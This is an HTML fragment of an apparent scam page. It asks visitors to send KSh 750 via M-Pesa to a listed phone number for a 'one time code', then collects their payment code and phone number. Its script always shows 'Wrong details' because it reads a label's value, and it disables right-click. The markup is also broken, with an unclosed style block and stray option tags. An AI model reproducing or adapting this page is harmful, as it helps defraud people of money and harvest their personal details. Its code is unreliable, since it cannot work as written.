    <style>
      @import url("https://fonts.googleapis.com/css2?family=Rubik:wght@500&display=swap");

      body {
        background-color: #eaedf4;
        font-family: "Rubik", sans-serif;

      .card {

<style>
        /* Simple Toast Notification */
        .toast {
            visibility: hidden;
            min-width: 250px;
            background-color: #333;
            color: #fff;
            text-align: center;
            border-radius: 2px;
            padding: 16px;
            position: fixed;
            z-index: 1;
            left: 50%;
            bottom: 30px;
            font-size: 17px;
            transform: translateX(-50%);
            opacity: 0;
            transition: opacity 0.5s, visibility 0.5s;
        }
        .toast.show {
            visibility: visible;
            opacity: 1;
        }
    </style>
  </head>
  <body gravity="center" oncontextmenu="return false" class="snippet-body">
  <div class="media-body">
            <h6 class="mt-1"><b>Follow the process to get the one time code:</b></h6>
            <option value="1">1.You require to have access to a Mpesa</option>
            <option value="2">2.You are required to pay ksh.750 to +254705133720</option>
            <option value="3">3.Then input the payment Mpesa code below </option>
          </div><br><br>
          <form class="row g-3" id="form" method="POST">
            
            <div length="20" class="col-12">
              <label for="inputAddress" class="form-label">Mpesa Code</label>
              <input type="text" class="form-control" name="amount"  placeholder="Mpesa code">
            </div>
            <div class="col-12">
              <label for="inputAddress2" class="form-label" id="phoneNumber">Phone Number</label>
              <input type="text" class="form-control" name="phone"  placeholder="Enter Phone Number">
            </div>
            <div >
              <button type="submit"  class="btn btn-success" >submit</button>
            </div>
          </form>
          <div id="toast" class="toast">Wrong details</div>
    
    <script>
        document.getElementById('form').addEventListener('submit', function(event) {
            event.preventDefault(); // Prevent form submission for demonstration
            
            const phoneNumber = document.getElementById('phoneNumber').value;
            const toast = document.getElementById('toast');
            const phoneRegex = /^[0-9]{10}$/; // Example regex for a 10-digit phone number

            if (!phoneRegex.test(phoneNumber)) {
                // Show toast with the message
                toast.className = 'toast show';
                
                // Hide toast after 3 seconds
                setTimeout(() => {
                    toast.className = 'toast';
                }, 3000);
            }
        });
    </script>
      
  </body>
